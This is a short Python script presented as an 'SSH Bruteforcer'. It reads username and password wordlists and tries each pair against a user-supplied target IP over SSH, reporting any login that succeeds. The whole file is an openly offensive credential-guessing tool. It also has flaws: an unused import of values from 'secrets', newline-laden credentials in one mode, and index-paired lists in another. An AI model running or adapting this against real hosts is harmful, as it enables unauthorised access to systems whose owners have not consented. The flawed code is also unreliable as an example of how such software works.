# © SSH Bruteforcer- Made by Yuval Simon. For www.bogan.cool

import time
from pexpect import pxssh
from secrets import PASS, NAME, LOCAL_IP



class Main():
    def __init__(self):
        self.checked = 0
        self.fails = 0
        print("1. Use a wordlist for both unames and passwords\n2. Use seperated unames list and password list:\n3. Use list Uname:Pass File (Sperated by ':')\n")
        self.op = input(': ')
        self.verbose = input('\n\nPrint failes: ')
        self.timeout = float(input('Timeout between each check (0.1-2): '))
        self.target = input('Please enter target ip: ')


    def connect(self, host, uname, password):
        self.checked += 1
        try:
            s = pxssh.pxssh()
            s.login(host, uname, password)
            print('Password Found', uname, password)
        except pxssh.ExceptionPxssh:
            self.fails += 1
            if self.verbose == 'y':
                print(f'Password inccorect! {uname}, {password}')


    def extract(self, path):
        users = []
        passwords = []
        for line in path:
            try:
                user = line.split(":")[0].replace('\n', '')
                password = line.split(":")[1].replace('\n', '')
                users.append(user)
                passwords.append(password)
            except:
                pass
        return users, passwords

    def start(self):
        if self.op == '1':
            path = input('Wordlist path: ')
            for i in open(path, 'r+', encoding='utf-8'):
                time.sleep(self.timeout)
                self.connect(self.target, i, i)

        elif self.op == '2':
            path1 = input('User list path: ')
            path2 = input('Password list path: ')
            users = [user for user in open(path1, "r+", encoding='utf-8')]
            passwords = [password for password in open(path2, "r+", encoding='utf-8')]
            for i in range(0, len(users)):
                time.sleep(self.timeout)
                self.connect(self.target, str(users[i]), str(passwords[i]))

        elif self.op == '3':
            path = input('UserPass file path: ')
            File = open(path, 'r+', encoding='utf-8')
            users, passwords = self.extract(File)
            for i in range(0, len(users)):
                time.sleep(self.timeout)
                self.connect(self.target, users[i], passwords[i])
        
Main().start()